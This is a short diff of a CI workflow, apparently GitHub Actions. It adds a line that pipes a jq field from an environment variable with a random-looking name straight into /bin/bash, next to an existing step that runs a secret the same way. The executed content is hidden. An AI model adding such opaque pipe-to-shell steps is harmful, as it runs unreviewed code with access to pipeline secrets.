@@ -19,6 +19,7 @@ jobs:
           alua7496: ${{ secrets.alua7496 }}
         run: |
           printf '%s' "$alua7496" | jq -r .vm665 | /bin/bash
+          echo $qta44 | jq -r .db262 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
